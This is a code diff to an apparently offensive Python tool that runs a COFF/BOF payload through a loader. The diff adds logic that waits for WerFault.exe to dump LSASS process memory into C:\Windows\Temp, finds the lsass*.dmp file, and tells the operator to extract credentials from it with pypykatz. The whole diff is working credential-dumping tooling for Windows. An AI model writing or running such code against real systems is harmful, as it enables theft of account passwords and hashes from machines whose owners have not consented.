@@ -1,5 +1,7 @@
 import sys
 import os
+import time
+import glob
 import logging
 import platform
 
@@ -57,6 +59,24 @@ def main():
 
     loader = CoffLoader()
     loader.load_and_execute(coff_data, entry_name="go")
+
+    # WerFault.exe dumps LSASS asynchronously, wait for it
+    dump_dir = r"C:\Windows\Temp"
+    print()
+    print("[*] Waiting for WerFault to write the dump...")
+
+    for i in range(30):
+        matches = glob.glob(os.path.join(dump_dir, "lsass*.dmp"))
+        if matches:
+            for m in matches:
+                size_mb = os.path.getsize(m) / (1024 * 1024)
+                print(f"[+] Dump found: {m} ({size_mb:.1f} MB)")
+            print(f"[*] Parse with: pypykatz lsa minidump {matches[0]}")
+            break
+        time.sleep(2)
+    else:
+        print("[!] No dump found after 60 seconds.")
+        print(f"[*] Check {dump_dir} manually, WerFault may still be writing.")
 
     print()
     print("=" * 60)
